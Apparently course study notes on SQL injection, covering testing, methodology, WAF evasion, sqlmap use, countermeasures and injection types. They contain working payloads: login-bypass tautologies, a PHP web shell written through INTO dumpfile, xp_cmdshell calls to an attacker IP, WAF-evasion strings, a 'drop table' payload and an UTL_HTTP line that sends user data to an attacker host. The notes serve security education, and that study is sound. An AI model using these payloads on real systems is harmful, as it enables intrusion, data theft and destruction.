# SQL injection overview

- Also known as ***SQLi***
- Injecting malicious SQL queries into the application.
- Allows attacker to
  - Gain unauthorized access to system e.g. logging in without credentials
  - Retrieve, modify or delete the information stored in the database
    - E.g. inserting new users, updating passwords
  - Execute code remotely
- Exploits improper input validation in web applications
- A [code injection](../13-web-applications/owasp-top-10-threats.md#code-injection) technique.
- üí° Can test on admin panels e.g. to find using google dorks `inurl:adminlogin.aspx`,  `inurl:admin/index.php`, `inurl:adminlogin.aspx`
- üìù Simple and quick way to test for SQL injection vulnerability is to insert a single quote (`'`)
  - You can add other SQL code after that once vulnerability is verified.

## SQL definition

- Structured Query Language
- Lets you access and manipulate databases
- SQL can be used to query both relational and non-relational databases
  - However SQL database usually means relational database.

## Testing SQL injection

### Black box testing

- Also known as ***blackbox testing*** or ***black-box testing***
- Source code is not known to the tester
- Detect places where input is not sanitized

#### Function testing

- Output is compared to expected results
- E.g. setting `?id=` query parameter to `1'` then to `1'/*` then to `'1' AND '1'='1` ..

#### Fuzz testing

- Also known as ***fuzzing*** testing
- üìù Inputting invalid/unexpected or random data and observing the changes in the output
- Often automated
- Monitors for exceptions such as crashes, failing built-in code assertions, or potential memory leaks
- Tools: ‚Ä¢ [WSFuzzer](https://sourceforge.net/projects/wsfuzzer/) ‚Ä¢ [WebScarab](https://github.com/OWASP/OWASP-WebScarab) ‚Ä¢¬†[Burp Suite](./../05-vulnerabilities/vulnerability-analysis.md#burp-suite) ‚Ä¢¬†[AppScan](https://www.hcltechsw.com/products/appscan)q  [Peach Fuzzer](https://www.peach.tech/products/peach-fuzzer/)

### White box testing

- Also known as **whitebox testing** or **white-box testing**.
- Analyzing application source code.
- **Static code analysis**
  - Detect on source code
- **Dynamic code analysis**
  - Analyze during execution of the code
- Tools include: ‚Ä¢ [Veracode](https://www.veracode.com/) ‚Ä¢ [RIPS](https://github.com/robocoder/rips-scanner) ‚Ä¢¬†[PVS Studio](https://www.viva64.com/en/pvs-studio/)

## SQL injection methodology

1. **Information gathering**
   - E.g. database structure, name, version, type..
   - Goal is to identify vulnerabilities for SQL injection.
   - Entry points in application tested to inject queries, e.g. invalidated input fields.
   - üí° [Error messages](./sql-injection-types.md#error-based-sql-injection) can reveal information about the database type and version.
2. **SQL injection**
   - Attacks to extract information from database such as name, column names, and records.
   - Can also insert or update certain information in the database.
     - E.g. modifying password of an existing user or inserting himself as new user to gain access.
3. **Advanced SQL injection**
   - Goal is to compromise underlying OS and network
   - Techniques include
     - Interacting with file system
       - E.g. in MySQL: `LOAD_FILE()` to read and `OUTFILE()` to write
     - Collect network information
       - E.g. reverse DNS: `exec master..xp_cmdshell 'nslookup a.com MyIP'`
       - E.g. reverse pings: `'; exec master..xp_cmdshell 'ping 10.0.0.75' --`
     - Executing commands that call OS functions at runtime
       - E.g. in MySQL: `CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll'`
     - Creating [backdoor](../07-malware/malware-overview.md#backdoor) to use execute commands using a remote shell
       - E.g. `SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'`
     - Transfer database to attackers machine
       - E.g. by using [`OPENROWSET`](https://docs.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql)

## SQL evasion

- Obfuscating input strings to avoid signature-based detection systems
- Using [IP fragmentation](../03-scanning-networks/bypassing-ids-and-firewall.md#packet-fragmentation) with optionally trying different orders

### Obfuscation against signature detection

| Technique |¬†Plain-text | Obfuscated text |
| --------- | ---------- | --------------- |
| In-line comment | `select * from users` | `s/**/ele/**/ct/**/*/**/from/**/users` |
| Char encoding | `e` | `char(101)` |
| String concatenation | `Hello` | `'Hel'+'lo'` |
| Obfuscated codes | `/?id==1+union+(select+1,2+from+test.users)` | `/?id=(1)union(((((((select(1),hex(hash)from(test.users))))))))` |
|¬†Manipulating white spaces | `OR 1 = 1` | `'OR'1'='1'` |
| Hex encoding | `SELECT @@version = 31` | `SELECT @@version = 0x1F` |
| Sophisticated Matches | `OR 1 = 1` | `OR 'hi' = 'hi'` |
| URL Encoding | `select * from users` | `select%20%2A%20from%20users` |
| Case Variation | `select * from users`  | `SeLeCt * FrOM UsErs` |
| Null byte | `UNION SELECT..` | `%00' UNION SELECT..` |
| Declare Variables | `UNION Select Password` | `; declare @sqlvar nvarchar(70); set @myVAR = N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)` |

### OWASP categories

- [SQL injection bypassing WAF |¬†OWASP](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)
- **Normalization**
  - Obfuscating with e.g. comments
  - E.g. WAF blocks `/?id=1+union+select+1,2,3/*`
    - Attacker injects: `/?id=1+un/**/ion+sel/**/ect+1,2,3--`
    - Request passes WAF, SQL becomes `SELECT * from table where id =1 union select 1,2,3--`
- **HTTP Parameter Pollution (HPP)**
  - Injects delimiting characters into query strings
  - E.g. WAF blocks `/?id=1+union+select+1,2,3/*`
    - Attacker injects: `/?id=1&id=+&id=union=&id=+select+&1,2,3`
    - Test e.g. [google.com/search?q=hello&q=world](https://www.google.com/search?q=hello&q=world)
- **HTTP Parameter Fragmentation (HPF)**
  - Exploits SQL is built using more than parameter in backend
    - `Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);`
  - E.g. WAF blocks `/?a=1+union+select+1,2/*`
    - Attacker injects: `/?a=1+union/*&b=*/select+1,2`
- **Blind SQL Injection**
  - Replacing WAF signatures with their synonyms
  - E.g. WAF blocks `/?id=1+OR+0x50=0x50`
    - Attacker injects `/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1) ))=74`
- **Signature bypass**
  - E.g. WAF blocks is `/?id=1+OR+1=1`
    - Attacker injects `/?id=1+OR+0x50=0x50`

## SQL injection tools

- **[`sqlmap`](http://sqlmap.org/)**
  - Automatic SQL injection and database takeover tool
  - Requires session that can be retrieved through e.g. running [Burp Suite](https://portswigger.net/burp) as proxy.
  - Run e.g. `sqlmap -u https://cloudarchitecture.io/?id=3&Submit=Submit --cookie 'PHPSESSID=63j6; security:low'`
    - Outputs e.g.
      - `GET parameter id appears to be MySQL >= 5.0.12 AND time-based blind injectable`
      - `GET parameter id is 'Generic UNION query (NULL) - 1 to 20 columns' injectable`
    - `--dbs` parameter gets database names e.g. `mysql, phpmyadmin...`
    - `-D <database-name> --tables` parameters lists tables from given tabase name..
    - `-T <table-name> --columns` gives column names
    - `-C <comma-separated-column-names> --dump` to get columns
  - Can also crack hashes (not as fast as `hashcat`)

## SQL injection countermeasures

- **Weakness**: The database server runs OS commands
  - Run database with minimal rights
  - Disable OS commands like `xp_cmdshell` (for shell access)
    - Invoking `xp_cmdshell` spawns a Windows command shell with input string passed to it for execution
    - Providing local system level access to the server.
- **Weakness**: Using privileged account to connect to the database
  - Monitor DB traffic using an IDS
  - Apply least privilege rule for accounts/applications that access databases
- **Weakness**: Error message revealing important information
  - Suppress all error messages
  - Use custom error messages
- **Weakness**: No data validation at the server
  - Filter and sanitize all client data
  - Size and data type checks protects against buffer overruns
  - E.g.

    ```c#
      // Vulnerable code:
      var command = new SqlCommand("SELECT * FROM table WHERE name = " + login.Name, connection);
      // Safe code:
      var command = new SqlCommand("SELECT * FROM table WHERE name = @name ", connection);
      command.Parameters.Add("@name", SqlDbType.NVarChar, 20).Value = login.Name;
    ```

- **Weakness**: Implementing consistent coding standards
  - Server-side input validation, data access abstraction layer, custom error messages.
- **Weakness**: Firewalling the SQL Server
  - Allow only access from web server and administrators

# SQL injection types

- Types include
  - [In-band SQL injection](#in-band-sql-injection)
  - [Blind SQL injection](#blind-sql-injection)
  - [Out-of-band SQL injection](#out-of-band-sql-injection)
- Other classifications sometimes include
  - **Database management system-specific SQL injection**
    - Using specific SQL statements to certain database engine.
  - **Compounded SQL injection**
    - Combining SQL injection with other web application attacks such as ‚Ä¢ insufficient authentication ‚Ä¢ DDoS attacks ‚Ä¢ DNS hijacking ‚Ä¢ XSS.
    - E.g. DDoSing through `http://cloudarchitecture.io/azure?id=2 and WAITFOR DELAY '0:0:50'`
  - **Second-order SQL injection**
    - When user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way.
    - E.g. during login user name and password is retrieved as `WHERE username="$username" and password="$password"`, one could then set a password as `"); drop table users;` to delete the table and it will only executed during user login.

## In-band SQL injection

- Also known as ‚Ä¢ **classic SQL injection** ‚Ä¢ **in-band SQLi** ‚Ä¢ **classic SQLi**.
- Attacker uses one channel to inject malicious queries and retrieve results.

### Error-based SQL injection

- Causing database to throw errors and in such a way to identify the vulnerabilities
- One of the most common injections
- Examples
  - Through parameter tampering in GET/POST requests
    - E.g. adding `‚Ä≤` in the end: `http://testphp.vulnweb.com/listproducts.php?cat=1‚Ä≤`
      - Shows error: `Error: Check the manual that corresponds to your MySQL server version. Invalid syntax "' at line 1 Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74`
      - Reveals file names, database type etc.
    - Can use e.g. [Burp Suite](./../05-vulnerabilities/vulnerability-analysis.md#burp-suite)
  - Converting anything to integer: `or 1=convert(int, (select * from tablename))`
    - `Syntax error converting the nvarchar value '<sql execution result>'`

### System stored procedure

- **Stored procedure**: Precompiled function-like SQL statements supported by many DBMS.
- Injecting malicious queries into stored procedures
- E.g. `@vname` is vulnerable to injection in following procedure:

  ```sql
    CREATE PROCEDURE getDescription
      @vname VARCHAR(50)
    AS
      EXEC('SELECT description FROM products WHERE name = '''+@vname+ '''')
    RETURN
  ```

### Illegal/Logically incorrect query

- Goal is to gather information about the type and structure of the back-end database.
- Considered as a preliminary step for further attacks.
- Attacker takes advantage of error messages sent by the database on incorrect queries.
- Often exposes the names of tables and columns.
- E.g. `SELECT*FROM table_nameWHERE id=@id"` (missing whitespaces) would cause incorrect syntax error.

### UNION SQL injection

- üìù Using the `UNION` operator to inject a malicious query.
- Allows appending results to the original query.
- E.g. `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

### Tautology

- Manipulating the `WHERE` operator in the query to always have a `true` value
- üìù Utilizes `OR` operator e.g. by appending `OR 1 = 1`
- E.g. `select * from user_details where userid = 'abcd' and password = 'anything' or 'x'='x'`
- ü§ó In logic, a tautology is a formula which is true in every possible interpretation
  - E.g. either it will rain tomorrow, or it won't rain

### Comment SQL injection

#### End-of line comment

- Also known as ‚Ä¢ **terminating query** ‚Ä¢ **single-line comment** ‚Ä¢ ***end-of-line comment** ‚Ä¢¬†**end of line comment**.
- üìù Usually done by adding `--` at the end of the injected query
  - `--` (two dashes): comment out the rest so SQL engine ignores the rest of the query
- E.g. by appending `' or 1 = 1 --` in the end of the query would ignore the password check
  - `select * from users where name='injection starts here' or 1=1 --' AND password='pwd'`
  - Basically tells the server if 1 = 1 (always true) to allow the login.
  - Double dash (--) tells the server to ignore the rest of the query

#### Inline comments

- Using C-style comments to eliminate a part of the query.
- Requires attacker having a good idea of how the input is integrated.
- E.g.
  - Query is

    ```sql
      $sql = "INSERT INTO members (username, isadmin, password) VALUES ('".$username."', 0, '".$password."')"
    ```

  - Attackers input include `username` and `password`
  - Attacker enters following values to avoid password check:
    - `attacker', 1, /*`
    - `*/'pwd`
  - It then generate:

    ```sql
      INSERT INTO members (username, isadmin, password) VALUES ('attacker', 1, /*', 0, '*/'pwd')
    ```

### Piggyback query

- Also known as ‚Ä¢ **piggybacked query** ‚Ä¢ **piggy-backed query** ‚Ä¢ **statement injection**
- Appending malicious query to the end of the original one.
- Common way is to append the query delimiter (`;`)
  - E.g. `normal SQL statement + ";" + INSERT (or UPDATE, DELETE, DROP) <rest of injected query>`

## Blind SQL injection

- Also known as ‚Ä¢¬†**blind SQLi** ‚Ä¢ **inferential SQL injection** ‚Ä¢ **inferential SQLi** ‚Ä¢ **inference SQL injection** ‚Ä¢ **inference SQLi**
- Attacker is unable to see the direct results of the injected queries
  - instead attacker observes web applications response and behavior.
- As database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions.
- Allows remote database fingerprinting to e.g. know which type of database is in use
- Can be automated using e.g.
  - [Absinthe :: Automated Blind SQL Injection](https://github.com/cameronhotchkies/Absinthe)
  - [SQLBrute](https://securiteam.com/tools/5IP0L20I0E), multi threaded blind SQL injection bruteforcer in Python
  - [bsqlbf](https://code.google.com/archive/p/bsqlbf-v2/), a blind SQL injection tool in Perl

### Boolean-based blind SQL

- Also called **content-based blind SQL**
- Attacker forms queries to return `true` or `false`
- Depends on changing HTTP results depending on SQL results for each condition.
- Allows enumerating the database character by character (slow)
- E.g.
  - URL: `http://newspaper.com/items.php?id=2`
  - Query in back-end: `SELECT title, description, body FROM items WHERE ID = 2`
  - Attacker sends `http://newspaper.com/items.php?id=2 and 1=2` to make it return `false`
  - Attacker inspects if application shows a page or with which status code

### Time-based SQL injection

- Also called ‚Ä¢¬†**time delay SQL injection** ‚Ä¢ **double blind SQL injection** ‚Ä¢ **2blind SQL injection**
- üìù Using time delay to evaluate the result (true or false) of the malicious query
- Allows for testing of existing vulnerabilities.
- Uses commands like `waitfor`, `sleep`, `benchmark`
  - Helps with database fingerprinting as MySQL, MSSQL, and Oracle have different functions to get current time.
  - E.g. `http://www.site.com/vulnerable.php?id=1' waitfor delay '00:00:10'--`
- Allows enumerating each character (very slow)
  - E.g. if database name starts with A, wait 10 seconds
  - Can use character comparison, regex or `LIKE` in Microsoft SQL.
- Time consuming, but there are automated tools such as [`sqlmap`](http://sqlmap.org/)

#### Heavy query

- Injecting queries that takes time to test
- Useful when time functions such as `waitfor` are disabled by administrator
- E.g. `SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C`
  - Can inject something like: `1 AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)`

## Out-of-band SQL injection

- Also known as ‚Ä¢ **OOB injection** ‚Ä¢ **OOB SQLi**
- Exhilarate data through outbound channel
  - E.g. e-mail sending or file writing/reading functionalities
- Difficult as it depends on target having
  - Supported databases that can initiate outbound DNS or HTTP requests
  - Lack of input validation
  - Network access to the database server
  - Privileges execute the necessary function
- E.g. `||UTL_HTTP.request('http://test.attacker.com/'||(SELECT user FROM users))`
